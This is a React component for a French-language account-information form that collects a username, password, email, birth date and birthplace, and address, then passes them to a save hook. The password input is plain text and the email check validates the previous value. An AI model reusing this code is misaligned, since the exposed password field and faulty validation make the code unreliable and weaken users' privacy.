import React, { useState } from "react";
import { MdNavigateNext } from "react-icons/md";
import { GrFormPrevious } from "react-icons/gr";
import { countries } from "./countries.js";
import { useNext } from "./useNext.jsx";
import { useSaveMultipleData } from "./useSaveData.jsx";
import Svg from "./svg.jsx";

const boldStyle = { fontWeight: "bold" };

export const Form1 = () => {
  const [country, setCountry] = useState("");

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [dateofbirth, setDateOfBirth] = useState("");
  const [countryofbirth, setCountryOfBirth] = useState("");
  const [stateofbirth, setStateOfBirth] = useState("");
  const [cityofbirth, setCityOfBirth] = useState("");
  const [address, setAddress] = useState("");

  const [error, setError] = useState("");
  const validateEmail = (email) => {
    // Basic email regex pattern
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailPattern.test(email);
  };
  const handleChange = (e) => {
    const temp = e.target.value;
    setEmail(temp);
    if (validateEmail(email)) {
      setError("");
    } else {
      setError("L'adresse e-mail n'est pas valide");
    }
  };
console.log(country,"selected country")
  const next = useNext();

  const saveData = useSaveMultipleData();

  const handleNext = (e) => {
    e.preventDefault()
    saveData({
      countryf1: country,
      username: username,
      password: password,
      email: email,

      dob: dateofbirth,
      countryofbirth: countryofbirth,
      stateofbirth: stateofbirth,
      cityofbirth: cityofbirth,
      address: address,
    });
    next();
  };

  return (
    <div className="container card-0 justify-content-center">
      <div className="card-body px-sm-4 px-0">
        <div className="row justify-content-center mb-5"></div>
        <div className="row justify-content-center round">
          <div className="col-lg-10 col-md-12">
            <div className="card shadow-lg card-1">
              <div className="card-body inner-card">
                <div
                  style={{
                    backgroundColor: "black",
                    color: "white",
                    fontWeight: "bolder",
                  }}
                  className="text-center mb-5 py-2 rounded"
                >
                  <div>
                    <Svg />
                  </div>
                  <h2>Informations de compte</h2>
                </div>

                <form onSubmit={handleNext}>
                  <div className="row justify-content-center">
                    <div className="col-lg-5 col-md-6 col-sm-12">
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="inputEmail4">
                          Country
                        </label>
                        <select
                          onChange={(e) => {
                            setCountry(e.target.value);
                          }}
                          className="form-select"
                          required
                        >
                          {countries.map((country, index) => (
                            <option key={index}>{country}</option>
                          ))}
                        </select>
                      </div>
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="Mobile-Number">
                          Mot de passe
                        </label>

                        <input
                          onChange={(e) => setPassword(e.target.value)}
                          type="text"
                          className="form-control"
                          placeholder=""
                          required
                        />
                        {password.length <= 8 && (
                          <>
                            <span
                              style={{
                                color: "RGB(8, 155, 128)",
                                fontSize: "14px",
                                fontFamily: "Roboto",
                              }}
                            >
                              8 caractères ou plus
                            </span>
                            <br />
                          </>
                        )}
                      </div>
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="time">
                          Date de naissance
                        </label>
                        <input
                          onChange={(e) => {
                            setDateOfBirth(e.target.value);
                          }}
                          type="date"
                          className="form-control"
                          id="time"
                          placeholder="dd/mm/yyyy"
                          required
                        />
                      </div>
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="skill">
                          Département de naissance
                        </label>
                        <input
                          onChange={(e) => setStateOfBirth(e.target.value)}
                          type="text"
                          className="form-control"
                          id="Département"
                          placeholder=""
                          required
                        />
                      </div>
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="email">
                          Adresse
                        </label>
                        <input
                          onChange={(e) => {
                            setAddress(e.target.value);
                          }}
                          type="text"
                          className="form-control"
                          id="text"
                          placeholder=""
                          required
                        />
                      </div>
                    </div>
                    <div className="col-lg-5 col-md-6 col-sm-12">
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="last-name">
                          Nom d'utilisateur
                        </label>
                        <input
                          onChange={(e) => setUsername(e.target.value)}
                          type="text"
                          className="form-control"
                          id="last-name"
                          placeholder=""
                          required
                        />

                        {username.length <= 4 && (
                          <>
                            <span
                              style={{
                                color: "RGB(8, 155, 128)",
                                fontSize: "14px",
                                fontFamily: "Roboto",
                              }}
                            >
                              4 caractères ou plus
                            </span>
                          </>
                        )}
                      </div>
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="email">
                          Email
                        </label>
                        <input
                          onChange={handleChange}
                          type="email"
                          className="form-control"
                          id="email"
                          placeholder=""
                          required
                        />

                        {error && (
                          <>
                            <span
                              style={{
                                color: "RGB(8, 155, 128)",
                                fontSize: "14px",
                                fontFamily: "Roboto",
                              }}
                            >
                              L'adresse e-mail n'est pas valide
                            </span>
                          </>
                        )}
                      </div>
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="birth-country">
                          Pays de naissance
                        </label>
                        <select
                          onChange={(e) => {
                            setCountryOfBirth(e.target.value);
                          }}
                          className="form-select"
                          required
                        >
                          {countries.map((country, index) => (
                            <option key={index}>{country}</option>
                          ))}
                        </select>
                      </div>
                      <div className="form-group mb-4">
                        <label style={boldStyle} htmlFor="birth-city">
                          Ville de naissance
                        </label>
                        <input
                          onChange={(e) => {
                            setCityOfBirth(e.target.value);
                          }}
                          type="text"
                          className="form-control"
                          id="birth-city"
                          placeholder=""
                          required
                        />
                      </div>
                    </div>
                  </div>

                  <div className="row justify-content-center py-3">
                    <div className="col-10 d-flex justify-content-between flex-wrap">
                      <button
                        className="btn mb-3 mb-md-0"
                        disabled
                        style={{
                          borderRadius: "18px",
                          width: "100%",
                          maxWidth: "186px",
                          color: "white",
                          fontWeight: "700",
                          backgroundColor: "#D70022",
                        }}
                      >
                        <GrFormPrevious style={{ fontSize: "25px" }} />{" "}
                        Précédent
                      </button>
                      <button
                        className="btn"
                        type="onSubmit"
                        style={{
                          borderRadius: "18px",
                          width: "100%",
                          maxWidth: "186px",
                          color: "white",
                          fontWeight: "700",
                          backgroundColor: "#02bd9c",
                        }}
                      >
                        Continuer{" "}
                        <MdNavigateNext style={{ fontSize: "25px" }} />
                      </button>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
